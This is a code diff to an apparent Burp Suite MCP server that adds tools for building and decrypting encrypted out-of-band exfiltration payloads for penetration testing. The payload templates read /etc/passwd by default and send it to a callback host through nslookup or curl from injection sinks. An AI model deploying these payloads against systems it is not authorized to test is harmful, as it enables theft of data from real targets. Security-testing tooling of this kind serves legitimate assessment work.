@@ -1,10 +1,78 @@
 """Tools for Burp Collaborator - out-of-band testing for blind vulnerabilities."""
 
 import asyncio
+import base64
+import os
+import re
+from pathlib import Path
 
 from mcp.server.fastmcp import FastMCP
 
 from burpsuite_mcp import client
+
+
+# --- Encrypted OAST (blind-exfil data protection) --------------------------
+# When a blind-exfil payload smuggles data out over DNS/HTTP to a Collaborator
+# (or operator callback), the OOB provider logs the *content* in cleartext. A
+# local symmetric key lets the target encrypt the value client-side (before it
+# hits the wire) so the provider only ever sees ciphertext; the operator
+# decrypts locally. The key is target-visible (it rides in the injection
+# payload) but never reaches the OOB provider — that is the threat model.
+#
+# Key lives under .burp-intel/_oast_key/ (already gitignored via .burp-intel/),
+# dir 0700 / key 0600. Rule 9a is untouched: the real callback domain still
+# comes from generate_collaborator_payload / an operator-provided callback —
+# this layer only wraps the exfiltrated DATA.
+
+_OAST_KEY_NAME = "fernet.key"
+
+
+def _oast_key_dir() -> Path:
+    return Path.cwd() / ".burp-intel" / "_oast_key"
+
+
+def _get_oast_fernet():
+    """Load-or-create the local OAST symmetric key.
+
+    Returns (fernet, key_str, error). `error` is a non-empty operator-facing
+    message when the `cryptography` package is missing or the key can't be
+    persisted; in that case fernet is None.
+    """
+    try:
+        from cryptography.fernet import Fernet
+    except ImportError:
+        return None, "", (
+            "Encrypted OAST needs the `cryptography` package "
+            "(uv pip install cryptography). Feature unavailable until installed."
+        )
+    key_dir = _oast_key_dir()
+    key_path = key_dir / _OAST_KEY_NAME
+    try:
+        key_dir.mkdir(parents=True, exist_ok=True)
+        os.chmod(key_dir, 0o700)
+        if key_path.exists():
+            key = key_path.read_bytes().strip()
+        else:
+            key = Fernet.generate_key()
+            # O_CREAT with 0600 so the secret is never briefly world-readable.
+            fd = os.open(str(key_path), os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
+            with os.fdopen(fd, "wb") as fh:
+                fh.write(key)
+        os.chmod(key_path, 0o600)
+        return Fernet(key), key.decode("ascii"), ""
+    except (OSError, ValueError) as exc:
+        return None, "", f"failed to load/create OAST key at {key_path}: {exc}"
+
+
+def _b32_dns_encode(token: bytes) -> str:
+    """DNS-label-safe encoding of a Fernet token (base32, unpadded, lowercased)."""
+    return base64.b32encode(token).decode("ascii").rstrip("=").lower()
+
+
+def _b32_dns_decode(text: str) -> bytes:
+    cleaned = re.sub(r"[^a-zA-Z2-7]", "", text).upper()
+    pad = (-len(cleaned)) % 8
+    return base64.b32decode(cleaned + "=" * pad)
 
 
 # R23: in-process Collaborator pool. Pre-generated subdomains live here
@@ -156,6 +224,144 @@ def register(mcp: FastMCP):
             lines.append("Consider increasing poll_seconds or testing other parameters.")
 
         return "\n".join(lines)
+
+    @mcp.tool()
+    async def build_encrypted_oast_payload(
+        callback_domain: str,
+        exfil_scheme: str = "dns",
+        secret_expr: str = "open('/etc/passwd','rb').read()",
+        sample_value: str = "",
+    ) -> str:
+        """Build a blind-exfil OAST payload that encrypts the leaked DATA with a
+        local key before it hits the wire, so the OOB provider (Collaborator /
+        interact.sh) only ever logs ciphertext.
+
+        The real callback domain MUST come from generate_collaborator_payload
+        (Burp Pro) or an operator-provided callback (interact.sh / webhook.site).
+        This tool never fabricates one — pass the subdomain you obtained.
+
+        Threat model: the symmetric key rides inside the injection payload (the
+        target needs it to encrypt) but never reaches the OOB provider, which
+        sees only the callback traffic. The operator decrypts captures locally
+        with decrypt_oast_capture. Use in contexts where the target can run the
+        encrypt step (RCE / command injection / SSTI).
+
+        Args:
+            callback_domain: real Collaborator/callback subdomain (NOT fabricated)
+            exfil_scheme: 'dns' (base32 labels) or 'http' (query param)
+            secret_expr: target-side Python expression returning the secret bytes
+            sample_value: optional plaintext to also render as the exact on-wire
+                          ciphertext, so the operator can verify the round trip
+        """
+        if not callback_domain or not callback_domain.strip():
+            return (
+                "Error: no callback_domain. Rule 9a — never fabricate a callback. "
+                "Call generate_collaborator_payload() first (Burp Pro), or supply "
+                "your own interact.sh / webhook.site subdomain, then pass it here."
+            )
+        callback = callback_domain.strip()
+        scheme = exfil_scheme.strip().lower()
+        if scheme not in ("dns", "http"):
+            return f"Error: exfil_scheme must be 'dns' or 'http', got {exfil_scheme!r}"
+
+        fernet, key_str, err = _get_oast_fernet()
+        if err:
+            return f"Error: {err}"
+
+        lines = [
+            "Encrypted OAST Payload (data encrypted client-side; provider sees ciphertext):",
+            f"  Callback:   {callback}",
+            f"  Scheme:     {scheme}",
+            f"  Local key:  {_oast_key_dir() / _OAST_KEY_NAME} (0600)",
+            "",
+        ]
+
+        if scheme == "dns":
+            lines += [
+                "Target-side encrypt + DNS exfil (drop into an RCE/CMDi/SSTI sink):",
+                "```",
+                "python3 - <<'PY'",
+                "from cryptography.fernet import Fernet",
+                "import base64, os",
+                f"KEY = {key_str!r}.encode()",
+                f"secret = {secret_expr}",
+                "tok = base64.b32encode(Fernet(KEY).encrypt(secret)).decode().rstrip('=').lower()",
+                f"host = {callback!r}",
+                "for i in range(0, len(tok), 60):",
+                "    os.system('nslookup %s.%s' % (tok[i:i+60], host))",
+                "PY",
+                "```",
+                "",
+                "Capture the DNS labels via get_collaborator_interactions, concatenate",
+                "them, then decrypt_oast_capture(<concatenated-labels>).",
+            ]
+        else:  # http
+            lines += [
+                "Target-side encrypt + HTTP exfil (query param carries the token):",
+                "```",
+                'curl -s "http://%s/x?d=$(python3 -c "'
+                "from cryptography.fernet import Fernet;"
+                f"print(Fernet({key_str!r}.encode()).encrypt({secret_expr}).decode())"
+                '")"' % callback,
+                "```",
+                "",
+                "Capture the ?d= value via get_collaborator_interactions, then",
+                "decrypt_oast_capture(<token>).",
+            ]
+
+        if sample_value:
+            token = fernet.encrypt(sample_value.encode("utf-8"))
+            if scheme == "dns":
+                wire = _b32_dns_encode(token)
+            else:
+                wire = token.decode("ascii")
+            lines += [
+                "",
+                "Round-trip check (sample_value encrypted with the local key):",
+                f"  On-wire ciphertext: {wire}",
+                "  Verify with decrypt_oast_capture(<the string above>).",
+            ]
+
+        return "\n".join(lines)
+
+    @mcp.tool()
+    async def decrypt_oast_capture(ciphertext: str) -> str:
+        """Decrypt an OAST capture (ciphertext observed at the Collaborator /
+        callback) using the local OAST key. Operator-side counterpart to
+        build_encrypted_oast_payload.
+
+        Accepts either a raw Fernet token (HTTP exfil) or concatenated base32
+        DNS labels (DNS exfil) — dots/whitespace are stripped automatically.
+
+        Args:
+            ciphertext: the captured on-wire ciphertext string
+        """
+        if not ciphertext or not ciphertext.strip():
+            return "Error: empty ciphertext."
+        fernet, _key_str, err = _get_oast_fernet()
+        if err:
+            return f"Error: {err}"
+
+        from cryptography.fernet import InvalidToken
+
+        raw = ciphertext.strip()
+        # Attempt 1: raw Fernet token (HTTP scheme / urlsafe-base64).
+        try:
+            plain = fernet.decrypt(raw.encode("ascii"))
+            return f"Decrypted ({len(plain)} bytes):\n{plain.decode('utf-8', errors='replace')}"
+        except (InvalidToken, ValueError, UnicodeEncodeError):
+            pass
+        # Attempt 2: base32 DNS labels.
+        try:
+            token = _b32_dns_decode(raw)
+            plain = fernet.decrypt(token)
+            return f"Decrypted ({len(plain)} bytes):\n{plain.decode('utf-8', errors='replace')}"
+        except (InvalidToken, ValueError, base64.binascii.Error):
+            return (
+                "Error: decryption failed. Ciphertext is not a valid Fernet token "
+                "for the current local key (wrong key, corrupted capture, or "
+                "partial DNS labels). Confirm all labels were captured."
+            )
 
     @mcp.tool()
     async def get_collaborator_interactions() -> str:
